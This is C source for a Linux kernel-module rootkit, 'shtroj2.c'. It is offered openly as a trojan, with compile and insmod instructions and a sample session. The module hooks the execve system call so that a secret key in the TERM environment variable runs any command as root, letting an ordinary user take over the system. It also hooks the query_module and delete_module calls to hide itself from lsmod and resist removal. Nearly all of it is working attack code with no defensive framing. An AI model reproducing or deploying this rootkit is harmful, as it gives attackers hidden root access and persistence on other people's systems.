/* shtroj2.c by J.B. Lesage  <Sorcerer@root.com.cn>
  
  to load, set KEY to any password you like (KEY is a few lines down from here)
  compile with `cc -O9 -c shtroj2.c -o shtroj2.o`
  load with `insmod shtroj2.o`
  module will auto-hide and watch for TERM=KEY environment variables
 
  to use the trojan, configure your telnet client to send KEY:exe:arg0:arg1
  as the terminal type.  for example, ~p9q#rr5:/bin/sh will run sh
  ~p9q#rr5:/bin/ls:ls:-l:/ will run "ls -l /"
  the trojan can also be used to gain root from a normal uid, like this
Sat Jun  9 14:31:45 Sorcerer@nijen:~ id
uid=1000(Sorcerer) gid=1000(Sorcerer) groups=1000(Sorcerer)
Sat Jun  9 14:32:00 Sorcerer@nijen:~ export TERM="~p9q#rr5:/bin/sh"
Sat Jun  9 14:32:01 Sorcerer@nijen:~ exec su
sh-2.03# id
uid=0(gem) gid=0(gem) groups=1000(Sorcerer)
 
 to unhide the module for removal, use the format TERM=KEY:KEY

sh-2.03# lsmod
Module                  Size  Used by
sh-2.03# export TERM="~p9q#rr5:~p9q#rr5"
sh-2.03# lsmod
sh: /bin/lsmod: Identifier removed
sh-2.03# export TERM=linux
sh-2.03# lsmod
Module                  Size  Used by
shtroj2                 2368   0  (unused)
 
 */

#define KEY "~p9q#rr5" // ~p9q#rr5 is the default/example key
#define MODULE_NAME "shtroj2" // if you use another name, change this to it
// if you set MODULE_NAME, but it's not the name that the module is loaded as,
// the system will crash.  undef MODULE_NAME for no hiding

#define MODULE
#define __KERNEL__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/kmod.h>
#include <linux/vmalloc.h>
#include <linux/file.h>

#include <asm/module.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>

#ifdef __SMP__
#include <linux/smp_lock.h>
#endif


#ifndef sys_call_table
extern void *sys_call_table[];
#endif

#define api_4(a,b,c,d) ({int r;asm volatile("int $128":"=a"(r):"a"(a),"b"(b),"c"(c),"d"(d));r;})
#define execve(program,arglist,envlist) api_4(11,program,arglist,envlist)

int (*__old_execve__)(char *,char **,char **);
static int (*__old_delete_module__)(const char *name);
static int (*__old_query_module__)(const char *name, int which,
				   void *buf, size_t bufsize, size_t *ret);
int __new_execve__(char *exe,char **argv,char **envp) {
   
   asm volatile("pushf;pusha;");

     {
	char *env[64];
	int envc=0;
	
	while (!copy_from_user(&env[envc],&envp[envc],4)) {
	   if (!env[envc++]) break;
	   if (envc==sizeof(env)>>2) break;
	}
	env[(sizeof(env)>>2)-1]=(void *)0;
	
	if (envc) envc--;
	
	if (envc) {
	   char buf[1024-sizeof(env)];
	   int envn=0,len;
	   
	   while (envn<envc)
	     if ((len=strncpy_from_user(buf,env[envn++],sizeof(buf)))
		 >sizeof(KEY)) {
		char *s=buf,nc;
		
		while ((nc=*s++)) if (nc=='=') break;
		if (!nc) continue;
		
		s[-1]=0;
		if (strcmp(buf,"TERM")) continue;
		
		  {
		     char *key=s;
		     
		     while ((nc=*s++)) if (nc==':') break;
		     if (!nc) continue;
		
		     if (!*s) break;
		     
		     s[-1]=0;
		     if (strcmp(key,KEY)) continue;
		     
#ifdef MODULE_NAME   
		     if (!strcmp(s,KEY)) {
			sys_call_table[__NR_delete_module]=__old_delete_module__;
			sys_call_table[__NR_query_module]=__old_query_module__;
			return(-EIDRM);
		     }
#endif		     
		  }
		
		set_fs(KERNEL_DS);
		
		  {
		     char *_exe=s,*_argv[16],*_envp[]={"TERM=linux",NULL};
		     int _argc=0;
		     
		     while ((nc=*s++))
		       if (nc==':') {
			  s[-1]=0;
			  _argv[_argc++]=s;
			  if (_argc==((sizeof(_argv)>>2)-1)) break;
		       }
		     
		     if (!_argc) {
			_argc=1;
			_argv[0]=_exe;
		     }
		     
		     _argv[_argc]=(void *)0;
		     
		     if (*_exe) {
			int old_uid=current->uid,
			  old_gid=current->gid,
			  old_euid=current->euid,
			  old_egid=current->egid;
			
			current->uid=0;
			current->gid=0;
			current->euid=0;
			current->egid=0;
			
			set_fs(KERNEL_DS);
			execve(_exe,_argv,_envp);
			set_fs(USER_DS);
			
			current->uid=old_uid;
			current->gid=old_gid;
			current->euid=old_euid;
			current->egid=old_egid;
			
		     }
		     
		  }
	     }
	}
     }
	   
   asm volatile("popa;popf;movl %ebp,%esp;popl %ebp;jmp *(__old_execve__)");
}

#ifdef MODULE_NAME

int __new_delete_module__(const char *name) {
   
     {
	char *pathbuf=getname(name);
	
	if (!IS_ERR(pathbuf)) {
	   
	   if (!strcmp(pathbuf,MODULE_NAME)) {
	      putname(pathbuf);
	      return(-ENOENT);
	   }
	   
	   putname(pathbuf);
	}
     }
   
   return(__old_delete_module__(name));
}

int __new_query_module__(const char *name, int which,
			 void *buf, size_t bufsize, size_t *ret) {
   
   int r;
   
     {
	char *pathbuf=getname(name);
	
	if (!IS_ERR(pathbuf)) {
	   
	   if (!strcmp(pathbuf,MODULE_NAME)) {
	      putname(pathbuf);
	      return(-ENOENT);
	   }
	   
	   putname(pathbuf);
	}
     }

   if (!(r=__old_query_module__(name,which,buf,bufsize,ret)))
     if (which==QM_MODULES) {
	int modnum=0,modcount;
	char *p=buf,*namepos=NULL;
	
	if (copy_from_user(&modcount,ret,sizeof(modcount))) return(r);
	
	while (modnum++<modcount) {
	   char modname[256];
	   
	   if (strncpy_from_user(modname,p,sizeof(modname))<1)
	     return(r);
	   modname[sizeof(modname)-1]=0;
	   if (!strcmp(modname,MODULE_NAME)) {
	      namepos=p;
	      break;
	   }
	   p+=strlen(modname)+1;
	}
	
	if (namepos) {
	   modcount--;
	   if (copy_to_user(ret,&modcount,sizeof(modcount))) return(r);
	   modcount=(modcount-modnum)+1;
	   p+=7;
	   while(modcount) {
	      char modname[256];
	      int n;
	      
	      if ((n=strncpy_from_user(modname,p,sizeof(modname)))<1)
		return(r);
	      n++;
	      if (copy_to_user(namepos,modname,n))
		return(r);
	      namepos++;
	      p++;
	   }
	   
	}  
     }
   return(r);
}

#endif

int init_module(void) {
   __old_execve__=sys_call_table[__NR_execve];
   sys_call_table[__NR_execve]=__new_execve__;
#ifdef MODULE_NAME
   __old_delete_module__=sys_call_table[__NR_delete_module];
   sys_call_table[__NR_delete_module]=__new_delete_module__;
   __old_query_module__=sys_call_table[__NR_query_module];
   sys_call_table[__NR_query_module]=__new_query_module__;
#endif
   return(0);
}

void cleanup_module(void) {
   sys_call_table[__NR_execve]=__old_execve__;
#ifdef MODULE_NAME
   sys_call_table[__NR_delete_module]=__old_delete_module__;
   sys_call_table[__NR_query_module]=__new_query_module__;
#endif
}
